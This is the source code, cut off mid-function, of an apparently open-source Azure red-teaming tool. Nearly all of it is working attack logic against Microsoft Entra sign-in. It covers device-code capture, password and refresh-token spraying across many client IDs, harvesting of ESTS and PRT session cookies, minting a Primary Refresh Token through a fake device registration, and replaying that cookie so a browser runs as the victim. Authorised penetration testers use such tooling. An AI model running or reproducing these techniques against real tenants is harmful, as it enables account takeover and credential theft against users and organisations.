# Author: Mr.Un1k0d3r TrueCyber Inc
# Azure RedOps - A Swiss Army tool for Azure red teaming.
# Usage: $0.py --help

# Usage: if venv not created:
#   python3 -m venv AzureRedOps
# source AzureRedOps/bin/activate
# (AzureRedOps) $ python3 AzureRedOps.py
# (AzureRedOps) $ pip install -r requirements.txt

import os
import re
import jwt
import secrets
import time
import json
import base64
import urllib
import argparse
import requests
import datetime
import builtins

from includes.Webserver import WebServer
from playwright.sync_api import sync_playwright

VERSION = "0.1"

class AzureRedOps:
    VERSION = VERSION
    WHITESPACE_LENGTH = 16
    CREDS_FILE_PATH = ".azure_creds"
    DELAY_REQUEST = 15
    DATE_STANDARD = "%d-%m-%Y %H:%M:%S"
    DATE_ZULU = "%Y-%m-%dT%H:%M:%SZ"
    DEFAULT_AUDIENCE = "https://graph.microsoft.com"
    DEFAULT_SCOPE = "openid offline_access"
    DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
    DEFAULT_ENDPOINT = "microsoftonline.com"
    DEFAULT_BROWSER = "firefox"
    SUPPORTED_BROWSERS = ["firefox", "chromium", "webkit"]
    DEFAULT_FOCI_CLIENT = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    WEB_APP_TARGETS = {
        "outlook":    {"resource": "https://outlook.office365.com",     "url": "https://outlook.office.com/mail/"},
        "office":     {"resource": "https://www.office.com",            "url": "https://www.office.com/"},
        "teams":      {"resource": "https://api.spaces.skype.com",      "url": "https://teams.microsoft.com/"},
        "sharepoint": {"resource": "https://microsoft.sharepoint.com",  "url": "https://www.office.com/launch/sharepoint"},
        "onedrive":   {"resource": "https://microsoft-my.sharepoint.com","url": "https://www.office.com/launch/onedrive"},
        "portal":     {"resource": "https://management.core.windows.net","url": "https://portal.azure.com/"},
        "graph":      {"resource": "https://graph.microsoft.com",       "url": "https://developer.microsoft.com/en-us/graph/graph-explorer"},
    }
    SSO_COOKIES = ["x-ms-RefreshTokenCredential", "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "SignInStateCookie"]
    SSO_WARMUP_CLIENT = "4765445b-32c6-49b0-83e6-1d93765276ca"
    SSO_WARMUP_REDIRECT = "https://www.office.com/landingv2"

    def __init__(self):
        self.filters = []
        self.autosave = False
        self.autosave_username = ""
        self.check_privileges = False
        self.user_agent = self.DEFAULT_USER_AGENT
        self.default_audience = self.DEFAULT_AUDIENCE
        self.default_scope = self.DEFAULT_SCOPE
        self.format_print_extended = False
        self.debug_mode = False
        self.verbose_debug_mode = False
        self.use_beta = False
        self.builtin_print = None
        self.additional_headers = {}
        self.microsoft_endpoint = self.DEFAULT_ENDPOINT
        self.browser = self.DEFAULT_BROWSER

    def redirect_to_file(self):
        if self.builtin_print is None:
            self.builtin_print = builtins.print

        builtins.print = self.redirect_print

    def redirect_print(self, *args, **kwargs):
        output = args[0]
        timestamp = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")

        self.builtin_print(output)
        with open("output.txt", "a+") as f:
            f.write(f"[{timestamp}] {output}")

    @staticmethod
    def extract_guid(data):
        guid_pattern = r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'
        result = re.findall(guid_pattern, data)
        return result[0] if result else ""

    def w(self, data, length=None, delimeter=":"):
        if length is None:
            length = self.WHITESPACE_LENGTH
        return f"{data}{' ' * (length - len(data))}{delimeter} "

    def print_hint(self, data):
        for line in data:
            print(f"{self.w("Hint")}{line}")

    def is_debug(self, verbose = False):
        if verbose:
            if self.verbose_debug_mode:
                return True
            else:
                return False
        if self.verbose_debug_mode or self.debug_mode:
            return True
        return False

    def debug(self, data):
        if self.is_debug():
            print(f"{self.w("Debug")}{data}")

    def debug_print_http(self, http):
        print(f"{self.w("Debug")}Request: {http.request.url}")
        for header in http.request.headers:
            print(f"{self.w("Header")}{header}: {http.request.headers.get(header)}")

        print(f"{self.w("Body")}{http.request.body}")

        print(f"{self.w("Debug")}Response:")
        for header in http.headers:
            print(f"{self.w("Header")}{header}: {http.headers.get(header)}")

        print(f"{self.w("Body")}{http.text}")

    @staticmethod
    def is_args_set(args, arg, die=True):
        if hasattr(args, arg):
            data = getattr(args, arg)
            if not data == None:
                return getattr(args, arg)

        if die:
            print(f"Missing argument '{arg}' for this activity.")
            exit()
        return None

    @staticmethod
    def is_json(data):
        try:
            json.loads(data)
            return True
        except (ValueError, TypeError):
            return False

    @staticmethod
    def get_json(data, key):
        data = data.json()
        return data.get(key)

    @staticmethod
    def decode_jwt(token):
        return jwt.decode(token, options={"verify_signature": False})

    @staticmethod
    def now():
        return time.time()

    def format_date(self, timestamp, format=None):
        if format is None:
            format = self.DATE_STANDARD
        date = datetime.datetime.fromtimestamp(timestamp)
        return date.strftime(format)

    @staticmethod
    def set_authorization_header(headers, token):
        headers["Authorization"] = f"Bearer {token}"
        headers["Content-Type"] = "application/json"
        return headers

    def save_to_file(self, filename, data):
        with open(filename, "a+") as f:
            json.dump(data, f, indent=4)
        print(f"{self.w("Action")}Data saved to '{filename}'")

    def print_data(self, data, length=None):
        if length is None:
            length = self.WHITESPACE_LENGTH
        for item in data:
            if not self.filters or any(f in item for f in self.filters):
                if self.format_print_extended:
                    value = data.get(item)
                    if isinstance(value, list):
                        print(f"{self.w(item, length)}")
                        for v in value:
                            print(f"{self.w("", 8, "-")}{v}")
                    elif isinstance(value, dict):
                        print(f"{self.w(item, length)}")
                        for v in value:
                            print(f"{self.w("", 8, "-")}{v}: {value.get(v)}")
                    else:
                        print(f"{self.w(item, length)}{data.get(item)}")
                else:
                    print(f"{self.w(item, length)}{data.get(item)}")

    def save_credentials(self, access_token, refresh_token = None):
        if self.autosave:
            token_data = self.decode_jwt(access_token)
            self.save_azure_token_to_file(access_token, refresh_token, token_data.get("tid"), self.autosave_username)
            print(f"{self.w("Action")}Access token saved for '{self.autosave_username}'.")

    def parse_headers(self, headers):
        try:
            headers = json.loads(headers)
        except:
            print(f"{self.w("Error")}Custom headers is not a valid JSON format.", True)
        self.additional_headers = headers

    def http_request(self, url, headers=None, send_json=True, expect_json=True, verb="POST", data=None):
        if headers is None:
            headers = {}
        headers.setdefault("User-Agent", self.user_agent)

        for item in self.additional_headers:
            headers.setdefault(item, self.additional_headers.get(item))

        response = None
        try:
            if verb == "POST":
                if send_json and isinstance(data, dict):
                    if not "Content-Type" in headers:
                        headers.setdefault("Content-Type", "application/json")
                    response = requests.post(url, json=data, headers=headers)

                else:
                    if not "Content-Type" in headers:
                        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
                    response = requests.post(url, data=data, headers=headers)

            elif verb == "PUT":
                if not "Content-Type" in headers:
                    headers.setdefault("Content-Type", "application/octet-stream")
                response = requests.put(url, data=data, headers=headers)

            else:
                response = requests.get(url, headers=headers)

            if self.is_debug(True):
                self.debug_print_http(response)

            if expect_json:
                return response.json()
            return response.text
        except Exception as e:
            print(f"{self.w("Error")}{str(e)}")
            exit()

    def save_azure_token_to_file(self, token, refresh_token, tenant, name):
        data = {}
        try:
            if os.path.exists(self.CREDS_FILE_PATH):
                with open(self.CREDS_FILE_PATH, "r") as f:
                    data = json.load(f)
        except:
            print(f"{self.w("Error")}Credentials file appear to be corrupted.")
            answer = input(f"{self.w("Action")}Do you want to restore the file. (yes/no): ")
            if not answer[:1] == "y":
                exit()

        data[name] = { "access_token": token, "refresh_token": refresh_token, "tenant" : tenant}

        with open(self.CREDS_FILE_PATH, "w") as f:
            json.dump(data, f, indent=4)

    def get_azure_token_from_file(self, name, key):
        print(f"{self.w("Action")}Loading access token '{name}'.")
        data = {}
        if os.path.exists(self.CREDS_FILE_PATH):
            with open(self.CREDS_FILE_PATH, "r") as f:
                data = json.load(f)

        token = data.get(name)
        if token == None:
            print(f"{self.w("Error")}Access token not found for '{name}'.")
            exit()
        data = token.get(key)
        if not data:
            print(f"{self.w("Error")}'{key}' not set for '{name}'.")
            exit()
        return data

    def list_saved_token(self):
        data = {}
        if os.path.exists(self.CREDS_FILE_PATH):
            with open(self.CREDS_FILE_PATH, "r") as f:
                data = json.load(f)

        for item in data:
            print(f"{self.w("Access token name")}{item}")

    def view_saved_token(self, name):
        print(f"{self.w("Action")}Loading access token '{name}'.")
        data = {}
        if os.path.exists(self.CREDS_FILE_PATH):
            with open(self.CREDS_FILE_PATH, "r") as f:
                data = json.load(f)

        token = data.get(name)
        if token == None:
            print(f"{self.w("Error")}Access token not found for '{name}'.")
            exit()

        try:
            data = self.decode_jwt(token.get("access_token"))
            for item in data:
                date = f" ({self.format_date(data.get(item))})" if item == "exp" else ""
                print(f"{self.w(item)}{data.get(item)}{date}")
        except Exception as e:
            print(f"{self.w("Error")}Access token is not a valid JWT for '{name}'.")
            exit()

    def delete_saved_token(self, name):
        print(f"{self.w("Action")}Deleting access token '{name}'.")
        if os.path.exists(self.CREDS_FILE_PATH):
            with open(self.CREDS_FILE_PATH, "r") as f:
                data = json.load(f)

        data.pop(name)

        with open(self.CREDS_FILE_PATH, "w") as f:
            json.dump(data, f, indent=4)

    def get_azure_tenant_id(self, tenant):
        response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/v2.0/.well-known/openid-configuration", verb="GET")
        if "token_endpoint" in response:
            print(f"{self.w("Url")}{response["token_endpoint"]}")
            print(f"{self.w("Tenant ID")}{self.extract_guid(response["token_endpoint"])}")
        else:
            print(f"{self.w("Error")}No Azure tenant for the '{tenant}' domain")

    def device_code_start(self, autostart, appId = "d3590ed6-52b3-4102-aeff-aad2292ab01c", tenant = "common"):
        if tenant == None:
            tenant = "common"
        print(f"{self.w("Success")}AppId is set to {appId}.")
        print(f"{self.w("Success")}Tenant is set to {tenant}.")
        data = { "client_id": appId, "resource": self.default_audience }
        response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/devicecode", data=data, send_json=False)

        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
            print(f"{self.w("Description")}{response["error_description"]}")
        else:
            print(f"{self.w("Url")}https://microsoft.com/devicelogin")
            print(f"{self.w("User Code")}{response["user_code"]}")
            print(f"{self.w("Device Code")}{response["device_code"]}")
            if autostart:
                print(f"{self.w("Action")}Autostarting capturing authentication.")
                self.device_code_capture(response["device_code"], appId, tenant)

    def device_code_capture(self, code, appId = "d3590ed6-52b3-4102-aeff-aad2292ab01c", tenant = "common"):
        if tenant == None:
            tenant = "common"

        token_received = False
        data = { "client_id": appId, "resource": self.default_audience, "grant_type": "urn:ietf:params:oauth:grant-type:device_code", "code": code }
        while not token_received:
            print(f"{self.w("Action")}Fetching authentication token.")
            time.sleep(self.DELAY_REQUEST)
            response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token", data=data, send_json=False)

            if "error" in response:
                if not "Authorization is pending" in response["error_description"]:
                    print(f"{self.w("Error")}{response["error"]}")
                    print(f"{self.w("Description")}{response["error_description"]}")
            else:
                token_received = True
                token = self.decode_jwt(response["access_token"])
                print(f"{self.w("Username")}{token.get("upn")}")
                print(f"{self.w("Tenant ID")}{token.get("tid")}")
                print(f"{self.w("Access Token")}{response["access_token"]}")
                print(f"{self.w("Refresh Token")}{response["refresh_token"]}")
                self.save_credentials(response["access_token"], response["refresh_token"])

    def auth(self, username, password, tenant, appid, version):
        if version == "v2.0":
            data = { "client_id": appid, "scope": self.default_scope, "username": username, "password": password, "grant_type": "password" }
            response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/token", data=data, send_json=False)
        else:
            data = { "client_id": appid, "scope": self.default_scope, "username": username, "password": password, "grant_type": "password", "resource": self.default_audience }
            data = urllib.parse.urlencode(data)
            response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token", data=data, send_json=False)

        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
            print(f"{self.w("Description")}{response["error_description"]}")
        else:
            print(f"{self.w("Access Token")}{response["access_token"]}")
            print(f"{self.w("Refresh Token")}{response["refresh_token"]}")
            self.save_credentials(response["access_token"], response["refresh_token"])

    def auth_app(self, tenant, appid="8545b2fc-a69c-4851-9206-0f74a519fe5f"):
        server = WebServer(tenant, appid, "localhost", 2342)
        url = server.generate_url()
        print(f"{self.w("Success")}Copy the following URL in your browser: {url}")
        code, verifier, redirect_url = server.server()
        print(f"{self.w("Success")}Got the authentication code: {code}")
        data = { "client_id": appid, "grant_type": "authorization_code", "code": code, "redirect_uri": redirect_url, "code_verifier": verifier, "scope": self.default_scope }

        response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/token", data=data, send_json=False)
        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
            print(f"{self.w("Description")}{response["error_description"]}")
        else:
            print(f"{self.w("Access Token")}{response["access_token"]}")
            print(f"{self.w("Refresh Token")}{response["refresh_token"]}")
            self.save_credentials(response["access_token"], response["refresh_token"])

    def is_wsl(self):
        if os.environ.get("WSL_DISTRO_NAME") or os.environ.get("WSL_INTEROP"):
            return True
        try:
            with open("/proc/version", "r") as f:
                return "microsoft" in f.read().lower()
        except Exception:
            return False

    def launch_browser(self, p):
        wsl = self.is_wsl()
        engine = (self.browser or self.DEFAULT_BROWSER).lower()
        if engine not in self.SUPPORTED_BROWSERS:
            print(f"{self.w("Hint")}Unknown browser '{engine}'. Falling back to '{self.DEFAULT_BROWSER}' (choices: {', '.join(self.SUPPORTED_BROWSERS)}).")
            engine = self.DEFAULT_BROWSER
        if wsl:
            print(f"{self.w("Action")}WSL detected: disabling GPU/hardware acceleration on {engine} to avoid the blank-window freeze.")
        print(f"{self.w("Action")}Launching {engine} (Playwright).")

        if engine == "chromium":
            args = ["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"] if wsl else []
            return p.chromium.launch(headless=False, args=args)
        if engine == "webkit":
            return p.webkit.launch(headless=False)
        prefs = {"gfx.webrender.force-disabled": True, "layers.acceleration.disabled": True} if wsl else {}
        return p.firefox.launch(headless=False, firefox_user_prefs=prefs)

    def dump_sso_cookies(self, cookies):
        found = [c for c in (cookies or []) if c.get("name") in self.SSO_COOKIES]
        if not found:
            print(f"{self.w("Hint")}No PRT/ESTS session cookie was present in this session (nothing to reuse).")
            return
        print(f"{self.w("Action")}Harvested {len(found)} reusable SSO cookie(s) from the browser session:")
        for c in found:
            name = c.get("name")
            value = c.get("value")
            if name == "x-ms-RefreshTokenCredential":
                print(f"{self.w("PRT Cookie")}{value}")
                print(f"{self.w("Reuse")}Replay this PRT for automatic SSO with:  -prt \"{value}\"")
            else:
                print(f"{self.w(name)}{value}")

    def auth_interactive(self, url, keep = False):
        delay = 75
        session_file_path = "session.har"

        print(f"{self.w("Action")}Spawning a browser to authenticate. The redirection will be send to {url}.")
        print(f"{self.w("Action")}You have {delay} seconds to complete the authentication.")

        try:
            with sync_playwright() as p:
                browser = self.launch_browser(p)
                context = browser.new_context(record_har_path=session_file_path)
                page = context.new_page()

                page.goto(f"https://login.{self.microsoft_endpoint}", wait_until="domcontentloaded")
                time.sleep(delay)

                for u in url.split(","):
                    print(f"{self.w("Action")}Waited for {delay} seconds. Redirecting to {u}.")
                    page.goto(u, wait_until="domcontentloaded")
                    time.sleep(10)

                try:
                    self.dump_sso_cookies(context.cookies())
                except Exception as e:
                    print(f"{self.w("Error")}Could not read browser cookies: {str(e)}")

                context.close()
                browser.close()
        except Exception as e:
            print(f"{self.w("Error")}{str(e)}")

        print(f"{self.w("Action")}Parsing the session.har file and gathering all access token.")

        access_tokens = []
        i = 0
        with open(session_file_path, "r", encoding="utf-8") as f:
            har_data = json.load(f)
            for entry in har_data["log"]["entries"]:
                url = entry["request"]["url"]
                if "/oauth2/v2.0/token" in url:
                    data = json.loads(entry["response"]["content"]["text"])
                    access_token = data.get("access_token")
                    refresh_token = data.get("refresh_token")
                    try:
                        self.decode_jwt(access_token)
                        access_tokens.append({ "access_token" : access_token, "refresh_token": refresh_token})
                        i += 1
                    except:
                        pass
        try:
            if not keep:
                os.unlink(session_file_path)
            else:
                print(f"{self.w("Action")}{session_file_path} file was preserved.")
        except:
            pass

        print(f"{self.w("Action")}A total of {len(access_tokens)} access token were found.")
        i = 0
        for token in access_tokens:
            print(f"{self.w(f"Token {i}")}Information")
            data = self.decode_jwt(token.get("access_token"))

            for item in data:
                date = f" ({self.format_date(data.get(item))})" if item == "exp" else ""
                print(f"{self.w(f"Token {i} - {item}")}{data.get(item)}{date}")
            i += 1

        options = input(f"{self.w("Action")}Select the access token you want to save (0 or 0,1,2): ")
        name = input(f"{self.w("Action")}Please specify a name for the saved credentials: ")
        options = options.split(",")

        for option in options:
            try:
                self.autosave_username = f"{name}-{option}"
                self.save_credentials(access_tokens[int(option)].get("access_token"), access_tokens[int(option)].get("refresh_token"))
            except:
                print(f"{self.w("Error")}Could not save {self.autosave_username}. Token ID invalid?")

    def refresh(self, refresh_token, tenant, appid, return_token = False, version = "v2.0"):
        if version == "v2.0":
            data = { "client_id": appid, "scope": self.default_scope, "grant_type": "refresh_token", "refresh_token": refresh_token }
            response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/token", data=data, send_json=False)
        else:
            data = { "grant_type": "refresh_token", "scope": self.default_scope, "resource": self.default_audience, "client_id": appid, "refresh_token": refresh_token }
            data = urllib.parse.urlencode(data)
            response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token", data=data, send_json=False)

        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
            print(f"{self.w("Description")}{response["error_description"]}")
        else:
            if not return_token:
                print(f"{self.w("Access Token")}{response["access_token"]}")
                print(f"{self.w("Refresh Token")}{response["refresh_token"]}")
                self.save_credentials(response["access_token"], response["refresh_token"])
            else:
                return response

    def obo(self, assertion, tenant, appid, secret, scope=None):
        if tenant is None:
            tenant = "common"
        if scope is None:
            scope = f"{self.default_audience}/.default"

        print(f"{self.w("Action")}Requesting On-Behalf-Of token for scope '{scope}'.")
        data = {
            "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
            "client_id": appid,
            "assertion": assertion,
            "scope": scope,
            "requested_token_use": "on_behalf_of",
        }
        if secret:
            data["client_secret"] = secret
        else:
            print(f"{self.w("Hint")}No client secret supplied (-cs). OBO normally requires a confidential client.")

        data = urllib.parse.urlencode(data)
        response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/token", data=data, send_json=False)
        if "error" in response:
            print(f"{self.w("Error")}{response["error"]}")
            print(f"{self.w("Description")}{response["error_description"]}")
        else:
            print(f"{self.w("Access Token")}{response["access_token"]}")
            if "refresh_token" in response:
                print(f"{self.w("Refresh Token")}{response["refresh_token"]}")
            if "scope" in response:
                print(f"{self.w("Scope")}{response["scope"]}")
            self.save_credentials(response["access_token"], response.get("refresh_token"))

    def resolve_web_target(self, target):
        if target is None:
            target = "outlook"
        preset = self.WEB_APP_TARGETS.get(target.lower())
        if preset:
            return preset["resource"], [preset["url"]]
        return self.default_audience, [u.strip() for u in target.split(",") if u.strip()]

    def _generate_device_name(self):
        # 8-char device name that always starts with "ARO-" (e.g. ARO-7K2Q).
        alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return "ARO-" + "".join(secrets.choice(alphabet) for _ in range(4))

    def mint_prt(self, refresh_token, tenant, appid=None):
        from includes.PRT import PRTManager, PRTError
        device_name = self._generate_device_name()
        print(f"{self.w("Action")}Registering device as '{device_name}'.")
        try:
            mgr = PRTManager(
                endpoint=self.microsoft_endpoint,
                user_agent=self.user_agent,
                rt_client_id=appid,
                log=lambda msg: print(f"{self.w("Action")}{msg}"),
            )
            result = mgr.mint_prt(refresh_token, tenant, device_name=device_name)
        except PRTError as e:
            print(f"{self.w("Error")}Auto-PRT failed: {str(e)}")
            return None, None, None
        except Exception as e:
            print(f"{self.w("Error")}Auto-PRT failed unexpectedly: {str(e)}")
            return None, None, None

        print(f"{self.w("Device Name")}{device_name}")
        print(f"{self.w("PRT")}{result["prt"]}")
        print(f"{self.w("Session Key")}{base64.b64encode(result["session_key"]).decode()}")
        if result.get("device_id"):
            print(f"{self.w("Device ID")}{result["device_id"]}")
        return mgr, result["prt"], result["session_key"]

    def _derive_and_show_cookie(self, mgr, prt, session_key, quiet=False):
        try:
            cookie = mgr.derive_cookie(prt, session_key)
        except Exception as e:
            print(f"{self.w("Error")}Could not derive the PRT cookie: {str(e)}")
            return None
        if not quiet:
            print(f"{self.w("PRT Cookie")}{cookie}")
            print(f"{self.w("Reuse")}Replay this PRT cookie directly with:  -prt \"{cookie}\"")
        return cookie

    def _seed_prt_cookie(self, context, cookie):
        context.add_cookies([{
            "name": "x-ms-RefreshTokenCredential",
            "value": cookie,
            "domain": f"login.{self.microsoft_endpoint}",
            "path": "/",
            "httpOnly": True,
            "secure": True,
            "sameSite": "None",
        }])
        try:
            stored = [c for c in context.cookies(f"https://login.{self.microsoft_endpoint}/")
                      if c.get("name") == "x-ms-RefreshTokenCredential"]
            if not stored:
                print(f"{self.w("Error")}PRT cookie ({len(cookie)} bytes) was NOT stored -- likely over the browser's ~4 KB cookie limit; ESTS will never receive it.")
        except Exception:
            pass

    def _extract_ests_error(self, page):
        try:
            html = page.content()
        except Exception:
            return None
        m = re.search(r"AADSTS\d+[^\"<\\]*", html)
        if m:
            return m.group(0).strip()
        m = re.search(r'"sErrorCode":"([^"]+)"', html)
        if m:
            return f"ESTS error code {m.group(1)}"
        return None

    def _authorize_url(self, tenant, prompt_none=False):
        url = (f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/authorize"
               f"?client_id={self.SSO_WARMUP_CLIENT}"
               f"&response_type=code"
               f"&redirect_uri={urllib.parse.quote(self.SSO_WARMUP_REDIRECT, safe='')}"
               f"&scope=openid+profile+offline_access"
               f"&response_mode=query")
        if prompt_none:
            url += "&prompt=none"
        return url

    def _warmup_sso(self, page, tenant):
        try:
            page.goto(self._authorize_url(tenant), wait_until="domcontentloaded")
            time.sleep(6)
            landed = page.url
            if f"login.{self.microsoft_endpoint}" not in landed:
                return True, landed, None
            return False, landed, self._extract_ests_error(page)
        except Exception as e:
            return False, None, str(e)

    def _diagnose_sso(self, page, tenant):
        try:
            page.goto(self._authorize_url(tenant, prompt_none=True), wait_until="domcontentloaded")
            time.sleep(3)
            if f"login.{self.microsoft_endpoint}" not in page.url:
                return "SSO actually succeeded under prompt=none."
            return self._extract_ests_error(page)
        except Exception as e:
            return str(e)

    def browser_sso(self, refresh_token, tenant, appid, target, prt_cookie=None, version="v2.0", keep=False, auto_prt=False):
        if tenant is None:
            tenant = "common"
        resource, urls = self.resolve_web_target(target)
        delay = 600
        session_file_path = "session.har"

        mgr = prt = session_key = None
        if auto_prt and not prt_cookie:
            print(f"{self.w("Action")}Auto-PRT: minting a PRT from the refresh token.")
            mgr, prt, session_key = self.mint_prt(refresh_token, tenant, appid)
            if not mgr:
                print(f"{self.w("Hint")}Auto-PRT failed; opening the browser without a seeded PRT cookie -- you may need to log in manually.")

        if not prt_cookie and not auto_prt:
            print(f"{self.w("Action")}Converting the refresh token to a '{resource}' scoped token.")
            if version == "v2.0":
                data = { "client_id": appid, "grant_type": "refresh_token", "refresh_token": refresh_token, "scope": f"{resource}/.default offline_access openid" }
                response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/token", data=data, send_json=False)
            else:
                data = { "client_id": appid, "grant_type": "refresh_token", "refresh_token": refresh_token, "resource": resource }
                data = urllib.parse.urlencode(data)
                response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token", data=data, send_json=False)

            if "error" in response:
                print(f"{self.w("Error")}{response["error"]}")
                print(f"{self.w("Description")}{response["error_description"]}")
            else:
                print(f"{self.w("Access Token")}{response["access_token"]}")
                if "refresh_token" in response:
                    print(f"{self.w("Refresh Token")}{response["refresh_token"]}")
                self.save_credentials(response["access_token"], response.get("refresh_token"))

        can_seed = bool(prt_cookie) or (mgr is not None)
        print(f"{self.w("Action")}Spawning a browser to open {', '.join(urls)}.")
        if not can_seed:
            print(f"{self.w("Hint")}No PRT cookie: pass -aprt to auto-mint one, or -prt to seed one. The browser will open the target but you must complete the login. Any API tokens above are saved.")

        try:
            with sync_playwright() as p:
                browser = self.launch_browser(p)
                context = browser.new_context(record_har_path=session_file_path, user_agent=self.user_agent)
                page = context.new_page()

                if can_seed:
                    if mgr is not None and not prt_cookie:
                        prt_cookie = self._derive_and_show_cookie(mgr, prt, session_key)

                    ok = False
                    max_attempts = 2 if mgr is not None else 1
                    for attempt in range(1, max_attempts + 1):
                        if attempt > 1 and mgr is not None:
                            print(f"{self.w("Action")}SSO not completed; retrying with a fresh nonce (attempt {attempt}).")
                            prt_cookie = self._derive_and_show_cookie(mgr, prt, session_key, quiet=True)
                        if not prt_cookie:
                            break
                        self._seed_prt_cookie(context, prt_cookie)
                        print(f"{self.w("Action")}Establishing an ESTS session from the PRT cookie.")
                        ok, landed, err = self._warmup_sso(page, tenant)
                        if ok:
                            print(f"{self.w("Action")}ESTS session established (landed on {landed}).")
                            break
                        if err:
                            print(f"{self.w("Error")}ESTS rejected the PRT cookie: {err}")
                        elif landed:
                            print(f"{self.w("Hint")}Still on the ESTS login page ({landed}).")
                    if not ok:
                        reason = self._diagnose_sso(page, tenant)
                        if reason:
                            print(f"{self.w("Reason")}{reason}")
                        print(f"{self.w("Hint")}Automatic SSO did not complete. Likely Conditional Access requiring a compliant/managed device, or MFA required for this app/user -- neither is bypassable with a freshly registered device. Finish the login manually in the open browser if you can.")

                for u in urls:
                    print(f"{self.w("Action")}Navigating to {u}.")
                    try:
                        page.goto(u, wait_until="domcontentloaded")
                    except Exception as e:
                        print(f"{self.w("Error")}Could not open {u}: {str(e)}")
                        break
                    time.sleep(5)
                print(f"{self.w("Action")}Browser is live as the user. Close the window when done (auto-closes after {delay}s).")
                sso_cookies = []
                waited = 0
                while browser.is_connected() and waited < delay:
                    try:
                        snapshot = [c for c in context.cookies() if c.get("name") in self.SSO_COOKIES]
                        if snapshot:
                            sso_cookies = snapshot
                    except Exception:
                        break
                    if not context.pages:
                        break
                    time.sleep(3)
                    waited += 3
                if browser.is_connected():
                    try:
                        context.close()
                        browser.close()
                    except Exception:
                        pass
                self.dump_sso_cookies(sso_cookies)
        except Exception as e:
            print(f"{self.w("Error")}{str(e)}")

        try:
            if not keep:
                os.unlink(session_file_path)
            else:
                print(f"{self.w("Action")}{session_file_path} file was preserved.")
        except:
            pass

    def graph_spray(self, username, password, tenant, filepath = "includes/auth_apps.json"):
        apps = None
        if filepath == None:
            filepath = "includes/auth_apps.json"
        print(f"{self.w("Action")}Spraying using {filepath} as the source.")
        with open(filepath) as f:
            apps = json.load(f)

        print(f"{self.w("Action")}Spraying v0 API.")
        for app in apps.get("v0"):
            appname = list(app.keys())[0]
            data = { "client_id": app.get(appname), "scope": self.default_scope, "username": username, "password": password, "grant_type": "password", "resource": self.default_audience }
            data = urllib.parse.urlencode(data)
            response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token", data=data, send_json=False)

            self.spray_print(response, appname, app.get(appname))

            time.sleep(1)

        print(f"{self.w("Action")}Spraying v2.0 API.")
        for app in apps.get("v2.0"):
            appname = list(app.keys())[0]
            data = { "client_id": app.get(appname), "scope": self.default_scope, "username": username, "password": password, "grant_type": "password" }
            response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/token", data=data, send_json=False)

            self.spray_print(response, appname, app.get(appname))

            time.sleep(1)

    def graph_spray_refresh(self, refresh_token, tenant, version, filepath = "includes/auth_apps.json"):
        data = None
        if filepath == None:
            filepath = "includes/auth_apps.json"
        print(f"{self.w("Action")}Spraying using {filepath} as the source.")
        with open(filepath, "r") as f:
            data = json.load(f)

        print(f"{self.w("Action")}Spraying v0 API.")
        for app in data.get("v0"):
            appname = list(app)[0]
            appid = list(app.values())[0]
            response = self.refresh(refresh_token, tenant, appid, True, version="v0")
            if response:
                self.spray_print(response, appname, appid)

            time.sleep(1)

        print(f"{self.w("Action")}Spraying v2.0 API.")
        for app in data.get("v2.0"):
            appname = list(app)[0]
            appid = list(app.values())[0]
            response = self.refresh(refresh_token, tenant, appid, True, version="v2.0")
            if response:
                self.spray_print(response, appname, appid)

            time.sleep(1)

    def spray_print(self, response, appname, guid):

                if not "error" in response:
                    print(f"{self.w("Success")}{appname} ({guid}) login successful.")
                    if self.check_privileges:
                        print(f"{self.w("Action")}Checking permissions.")
                        token = self.decode_jwt(response["access_token"])
                        print(f"{self.w("Token scope")}{token.get("scp")}")

                        output = self.graph_list_all_users(response["access_token"], None, "?$top=1", False)
                        if not "error" in output:
                           print(f"{self.w("Success")}All users can be enumerated.")

                        output = self.graph_list_applications(response["access_token"], None, "?$top=1", False)
                        if not "error" in output:
                           print(f"{self.w("Success")}All applications can be viewed.")

                else:
                    print(f"{self.w("Failed")}{appname} ({guid}) failed.")
                    print(f"{self.w("Failed")}{response["error"]}")

    def get_known_ids(self):
        data = None
        with open("includes/apps.json", "r") as f:
            data = json.load(f)

        for app in data.get("apps"):
            self.print_data(app, 48)

    def get_list_of_interest(self):
        data = None
        with open("includes/auth_apps.json", "r") as f:
            data = json.load(f)

        for item in data:
            print(f"{self.w("Category")}{item}")

    def get_ids_of_interest(self, id_only, type):
        data = None
        with open("includes/auth_apps.json", "r") as f:
            data = json.load(f)

        for item in data:
            if type == None or item in type:
                if not id_only:
                    print(f"{self.w("Category", 48)}{item}")
                for app in data.get(item):
                    if id_only:
                        for item in app:
                            print(app.get(item))
                    else:
